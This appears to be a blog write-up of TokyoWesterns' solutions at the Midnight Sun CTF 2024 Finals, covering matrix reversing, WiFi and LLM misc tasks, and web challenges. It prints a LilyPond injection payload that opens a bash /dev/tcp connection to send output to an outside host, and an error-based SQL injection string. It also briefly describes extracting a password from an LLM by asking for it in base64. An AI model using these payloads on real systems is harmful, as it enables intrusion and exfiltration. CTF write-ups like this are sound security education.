---
date: 2024-06-20T19:15:00.000+00:00
slug: midnight-sun-ctf-2024-finals
title: Midnight Sun CTF 2024 Finals

---

On June 15th and 16th, I participated in the Midnight Sun CTF 2024 Finals in Stockholm as a member of TokyoWesterns, and we won first place.


<div><x-twitter-preview url="https://x.com/TokyoWesterns/status/1802375866980487396"></x-twitter-preview></div>


# Writeups


## ☆concept43 (Reversing)


It was a program that repeatedly performed multiplication and exponentiation of a 40x40 matrix, checking if the results matched the expected outcome. The program was not obfuscated, and it could be easily analyzed using a decompiler.


```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int i; // [rsp+Ch] [rbp-1914h]
  uint32_t v5[1600]; // [rsp+10h] [rbp-1910h] BYREF
  unsigned __int64 v6; // [rsp+1918h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  fgets(s, 32, stdin);
  *strchrnul(s, 10) = 0;                        // remove '\n';
  for ( i = 0; i <= 30; ++i )
  {
    matrix_pow(M_M[i], s[i], v5);
    matrix_mul(v5, M_B, M_A);
    matrix_mul(M_L[i], M_A, M_B);
  }
  if ( !memcmp(M_B, M_target, 0x1900uLL) )
    puts("Yayz!");
  else
    puts("Nope.");
  return 0LL;
}
```


[file](/assets/post/midnight-sun-ctf-2024-finals/fe030af0-0a4c-4da6-bb8a-27155e02209f.i64)


The result of reversing can be rephrased as the following problem:


Given matrices $M_i, L_i, B (0\leq i\lt31)$ with elements in the ring of remainders modulo $2^{32}$, find the sequence of natural numbers $s_i (0\leq i \lt 31)$ that satisfies the following condition:


$$
L_{30}M_{30}^{s_{30}}L_{29}M_{29}^{s_{29}}\cdots L_{0}M_{0}^{s_{0}} = 0
$$


Since solving this problem directly seems impossible, we analyzed whether M and L have any special properties.


By taking the modulo 2 of M, we found that M can be expressed as the sum of a special matrix A, where all rows have the same form or are zero, and the identity matrix I.


![M mod 2](/assets/post/midnight-sun-ctf-2024-finals/049ec0a5-9aed-49cd-80b0-191e6d9d8e12.png)


Continuing with the experiments, we discovered that when $M_i = A_i + I $, $A_i^2 = 0$ always holds true. Therefore, $M_i ^ {s_i} = I + s_iA_i$  and exponentiation can be expressed through multiplication.


Additionally, since $L_{30}$ is a matrix where all rows except the first are zero, it can be considered as a vector. Consequently, matrix multiplication is unnecessary, leading to faster computations.


At this stage, we determined that exploration was feasible. We decided to solve it by exhaustively searching for the solution modulo 2, then using the results to search for the solution modulo 4, and finally modulo 8. By utilizing the fact that the prefix is `midnight{`, it reduced the search space to 22 bits, which was manageable on a local PC.


We successfully achieved the 2nd blood.


Continuing with the experiments, we discovered that when $M_i = A_i + I $, $A_i^2 = 0$ always holds true.
Therefore, $M_i ^ {s_i} = I + s_iA_i$ and exponentiation can be expressed through multiplication.


Additionally, since $L_{30}$ is a matrix where all rows except the first are zero, it can be considered as a vector. Consequently, matrix multiplication is unnecessary, leading to faster computations.


At this stage, we determined that exploration was feasible. We decided to solve it by exhaustively searching for the solution modulo 2, then using the results to search for the solution modulo 4, and finally modulo 8. By utilizing the fact that the prefix is `midnight{`, it reduced the search space to 22 bits, which was manageable on a local PC.


[file](/assets/post/midnight-sun-ctf-2024-finals/6c7b68a9-42cc-46c1-8177-9ea00d4a2ce8.rs)


We achieved the 2nd blood.


## You are my thoughts (Pwn)


When connecting to the website indicated in the problem statement, a website was displayed that converts music written in ABC notation into an image (PNG).


![screenshot of website](/assets/post/midnight-sun-ctf-2024-finals/c5b6dc33-c86c-4538-aec4-a7a5b02fde1d.png)


The source code was not disclosed, and the only information provided was that abc2ly (LilyPond) was being used, so I inferred the internal structure.


abc2ly is a tool that converts text in ABC notation to LilyPond format (ly format), but it does not have a direct function to convert to PNG format. I guessed that the conversion was done using the `lilypond --png` command. Since the ly format includes functions and is very complex, I considered the possibility of executing arbitrary commands. Upon investigation, I found that commands could be executed by writing something like `#(system "echo HELLO")`.


Next, I researched how to write this command from abc2ly and discovered that by writing `%%LY voices <arbitrary string>`, any string could be inserted into the voices without escaping.


By combining this knowledge, I successfully obtained the flag by passing `%%LY voices } #(system "bash -c '/flagdispenser > /dev/tcp/IP CENSORED/8080 2>&1'")` as input.


We achieved the 2nd blood.


## **GoodB10S** (Misc)


A WiFi 802.11 Access Point was set up, and a client was provided to connect to it. The communication was done over TCP instead of radio waves.


When I ran the client as it was, the authentication failed, and a Deauth frame containing the following message was returned:


"loats up behind you with a spooky cackle* Ah, you need my assistance, do you? rubs ghostly hands together Well, let's see what I can do to help... whispers You should send a scapy a PROBE-REQUEST with ELEMENT ID 0xDD and OUI 68EC8A. disappears into the ether with a haunting laugh"


Following the instructions and sending the Probe Request (using the successful one from my teammate chocorusk), I received the following message:


"If you want to know the password, let's play a game."


I was unsure of what to do next, but after some trial and error, I discovered that by sending text after the OUI in the Probe Request, it would be processed by an LLM, and I would receive a message in response. With the help of tyage and chocorusk, we requested the password in base64, and received a reply. The password turned out to be the flag.


The results were unstable, with responses like `midnight{wif1pr}` and `midnightctf{wif1pr0}`. The flag was `midnight{wif1pr0}`.


We achieved the 3rd blood.


## **GoodB10S** 2 (Misc)


In GoodB10S, the password `midnightsun{w1f1pr0}` occasionally provided by the LLM was the WiFi password. The correct SSID was `ghostnet`, which was broadcasting a Beacon.


After setting the correct SSID and password and running `ghostclient.py`, a tunnel Interface named `scapycli2` was created. Based on the hint from the organizers and the reference at [https://github.com/spr-networks/barely-ap/](https://github.com/spr-networks/barely-ap/), I inferred that the IP address of the other party was 10.10.0.1. I then set my IP address to 10.10.0.2 and attempted to ping, successfully communicating with 10.10.0.1.


Unsure of what to do next, I noticed while examining `fakenet.py` in the same repository that DHCP might be usable. I sent a DHCP request, and it turned out that the DHCP Ack contained the flag.


We achieved the 2nd blood.


## speed-web (Speed)


```php
  function sortItems($direction) {
    global $psqli;

    $direction = preg_replace("/;/i", "", $direction);
    $direction = preg_replace("/chr/i", "", $direction);
  
    $query = "SELECT * FROM items WHERE name NOT LIKE '%midnight{%' ORDER BY name $direction limit 10";
```


There was an obvious SQL injection vulnerability in the item sorting section. Since `;` could not be used, multi-statements were not an option.


Unable to find a way to include a string in the query result, I attempted to use blind SQL injection. Through trial and error, tyage suggested that an error-based approach might work. After a while, I discovered a method to display strings by casting them to integers.


I sent`limit (SELECT cast(name as int) FROM items WHERE name LIKE 'midnight%')--` as direction to retrieve the flag. We achieved 3rd place with 100 points.


# Notes


## Other Problems I Worked On


### **diaperpac (Pwn)**


My teammate ShiftCrops primarily solved this by brute-forcing the PAC (16-bit), but I helped with parallel execution and debugging the exploit.


It was frustrating to realize towards the end that the venue network imposed a limit on parallel execution, possibly due to exhausting the NAT table.


### **times16766 (Rev)**


Based on the reversing results by n4nu, I manually adjusted parameters to reveal flag-like strings. Eventually, tyage found the flag, and I am very grateful for that.


## Jailbroken iPhone


The problems babypac and diaperpac were on Corellium, a virtualized environment of iPhone. It was Jailbroken.


Since I don't usually use Apple products, it was my first time working with jailbroken iOS. I was surprised to find that it was well-organized, with an apt repository available for adding programs using apt-get.


## Contest Venue


Each team was given a room to participate in the contest from there. The space was very spacious, and we could solve problems comfortably without worrying about overhearing other teams.

